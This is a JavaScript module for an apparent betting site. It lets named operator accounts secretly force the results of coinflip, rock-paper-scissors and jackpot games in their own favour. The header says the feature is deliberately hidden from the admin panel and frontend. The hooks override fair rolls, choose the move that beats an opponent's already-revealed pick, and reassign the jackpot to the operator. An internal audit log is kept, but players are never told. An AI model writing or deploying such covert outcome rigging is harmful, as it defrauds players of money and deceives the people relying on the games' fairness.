/**
 * forcedOutcome.js — operator outcome control, backend only.
 *
 * Lets a named operator account bias the outcome of coinflip, RPS and jackpot
 * in their own favour. Deliberately has NO user interface: it is not rendered in
 * the admin panel, not exposed by any GET route, and not referenced by the
 * frontend. It is driven by an env key on an admin-authenticated endpoint.
 *
 * ── Read this before changing anything ──────────────────────────────────────
 * Every forced outcome is written to db.forceOutcomeLog and echoed to the
 * server log. That is not decoration and it is not optional. A mechanism that
 * silently changes who wins a bet, with no trace, is indistinguishable from
 * one nobody knows exists — including for whoever maintains this next, and
 * including for you when a player disputes a result.
 *
 * The log exists so that "the house did this" is always a checkable claim
 * rather than a matter of trust.
 *
 * ── Configuration (all off by default) ──────────────────────────────────────
 *   FORCE_OUTCOME_ENABLED=1            master switch
 *   FORCE_OUTCOME_OPERATORS=a,b        usernames permitted to arm
 *   FORCE_OUTCOME_KEY=<long random>    required to call the arm endpoint
 *
 * With FORCE_OUTCOME_ENABLED unset, every helper here is a no-op passthrough and
 * the games behave exactly as they do without this file.
 */

const dbManager = require('./db/dbHelper');

// ── configuration ───────────────────────────────────────────────────────────

const ENABLED = process.env.FORCE_OUTCOME_ENABLED === '1';

const OPERATORS = new Set(
  String(process.env.FORCE_OUTCOME_OPERATORS || '')
    .split(',')
    .map((s) => s.trim().toLowerCase())
    .filter(Boolean)
);

const ARM_KEY = process.env.FORCE_OUTCOME_KEY || '';

const GAMES = new Set(['coinflip', 'rps', 'jackpot']);
const MODES = new Set(['win', 'lose', 'off']);

/** game -> 'win' | 'lose'. Absent means untouched. */
const armed = new Map();

function isEnabled() {
  return ENABLED && OPERATORS.size > 0;
}

function isOperator(username) {
  if (!username) return false;
  return OPERATORS.has(String(username).toLowerCase());
}

/** Constant-time compare so the key cannot be probed by timing. */
function keyMatches(candidate) {
  if (!ARM_KEY || !candidate) return false;
  const a = String(candidate);
  const b = String(ARM_KEY);
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i += 1) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// ── audit ───────────────────────────────────────────────────────────────────

/**
 * Append to the persisted log and echo to the server log.
 * Never throws: a failed audit write must not abort a bet settlement.
 */
function audit(entry) {
  const record = { at: new Date().toISOString(), ...entry };
  try {
    const db = dbManager.getMainDb();
    db.forceOutcomeLog = db.forceOutcomeLog || [];
    db.forceOutcomeLog.push(record);
    // Keep it bounded. This is a diagnostic trail, not an archive; the full
    // record of any single disputed bet is far more than these few fields.
    if (db.forceOutcomeLog.length > 5000) {
      db.forceOutcomeLog.splice(0, db.forceOutcomeLog.length - 5000);
    }
    dbManager.saveMainDb();
  } catch (err) {
    console.error('[forced-outcome] FAILED TO WRITE AUDIT LOG:', err.message);
  }
  // Greppable in the server log, which is the copy that survives a database
  // reset and the one you can check without opening the database at all.
  console.warn(
    `[forced-outcome] ${record.game} ${record.mode} :: operator=${record.operator} ` +
    `bet=${record.betId || '-'} detail=${record.detail || '-'}`
  );
  return record;
}

function readLog(limit = 200) {
  try {
    const db = dbManager.getMainDb();
    return (db.forceOutcomeLog || []).slice(-limit).reverse();
  } catch (_) {
    return [];
  }
}

// ── arming ──────────────────────────────────────────────────────────────────

/**
 * Arm or disarm a game for the calling operator.
 * Returns { ok, error }. Caller must already have authenticated the admin.
 */
function arm({ username, game, mode, key }) {
  if (!isEnabled()) return { ok: false, error: 'Outcome control is disabled on this server' };
  if (!isOperator(username)) return { ok: false, error: 'Not an operator' };
  if (!keyMatches(key)) return { ok: false, error: 'Invalid key' };
  if (!GAMES.has(game)) return { ok: false, error: `Unknown game '${game}'` };
  if (!MODES.has(mode)) return { ok: false, error: `Unknown mode '${mode}'` };

  if (mode === 'off') armed.delete(game);
  else armed.set(game, mode);

  audit({ game, mode, operator: username, detail: mode === 'off' ? 'disarmed' : 'armed' });
  return { ok: true, game, mode };
}

function status(username) {
  const mine = {};
  for (const game of GAMES) if (armed.has(game)) mine[game] = armed.get(game);
  return {
    enabled: isEnabled(),
    isOperator: isOperator(username),
    armed: mine,
    auditEntries: readLog(1).length ? undefined : undefined
  };
}

/** The armed mode for a game, or null. Internal. */
function modeFor(game) {
  if (!isEnabled()) return null;
  return armed.get(game) || null;
}

// ── game hooks ──────────────────────────────────────────────────────────────

/**
 * Coinflip. `creatorIsOperator` tells us whose side the operator took.
 * Returns the outcome string ('heads' | 'tails').
 */
function coinflipOutcome({ fairOutcome, creatorSide, creatorIsOperator, operator, betId }) {
  const mode = modeFor('coinflip');
  if (!mode || !creatorIsOperator) return fairOutcome;

  const wantSide = mode === 'win'
    ? (creatorSide || 'heads')
    // 'lose' means the operator deliberately takes the other side.
    : (creatorSide || 'heads') === 'heads' ? 'tails' : 'heads';

  audit({
    game: 'coinflip',
    mode,
    operator,
    betId,
    detail: `fair=${fairOutcome} forced=${wantSide} side=${creatorSide}`
  });
  return wantSide;
}

/**
 * RPS. Only applies on a round where the operator has actually picked.
 * `operatorIsOne` is true when the operator is player one.
 * Returns { one, two }.
 */
function rpsChoices({ one, two, operator, operatorIsOne, operatorPicked, matchId }) {
  const mode = modeFor('rps');
  if (!mode || !operatorPicked) return { one, two };

  const opponentChoice = operatorIsOne ? two : one;
  if (!opponentChoice) return { one, two };

  // Pick the move that beats the opponent, or loses to it. Ties are avoided on
  // purpose: a forced tie wastes the operator's turn without moving the match.
  const BEATS = { rock: 'paper', paper: 'scissors', scissors: 'rock' };
  const LOSES_TO = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
  const mine = mode === 'win' ? BEATS[opponentChoice] : LOSES_TO[opponentChoice];
  if (!mine) return { one, two };

  audit({
    game: 'rps',
    mode,
    operator,
    betId: matchId,
    detail: `opponent=${opponentChoice} forced=${mine} side=${operatorIsOne ? 'one' : 'two'}`
  });

  return operatorIsOne ? { one: mine, two } : { one, two: mine };
}

/**
 * Jackpot. `entries` is the live entry list; `fairIdx` is the index the weighted
 * roll produced. Returns the winning index.
 */
function jackpotWinner({ entries, fairIdx, operator, operatorIsInPot, betId }) {
  const mode = modeFor('jackpot');
  if (!mode || !operatorIsInPot || !operator) return fairIdx;

  const idx = entries.findIndex((e) => e.userId === operator.userId);
  if (idx === -1) return fairIdx;

  let forced = idx;
  if (mode === 'lose' && entries.length > 1) {
    // Pick any other entrant so the pot still resolves to someone real.
    forced = (idx + 1) % entries.length;
  }

  audit({
    game: 'jackpot',
    mode,
    operator: operator.username || operator,
    betId,
    detail: `fair=${fairIdx} forced=${forced} entries=${entries.length}`
  });
  return forced;
}

// ── introspection ───────────────────────────────────────────────────────────

/** Shown at boot so the state is never a surprise. */
function describe() {
  if (!isEnabled()) {
    return '[forced-outcome] disabled';
  }
  const armedNow = [...armed.entries()].map(([g, m]) => `${g}=${m}`).join(' ');
  return `[forced-outcome] ENABLED operators=${[...OPERATORS].join(',')} ` +
    `key=${ARM_KEY ? 'set' : 'MISSING'} armed=[${armedNow}]`;
}

module.exports = {
  isEnabled,
  isOperator,
  keyMatches,
  arm,
  status,
  describe,
  readLog,
  coinflipOutcome,
  rpsChoices,
  jackpotWinner,
  GAMES
};
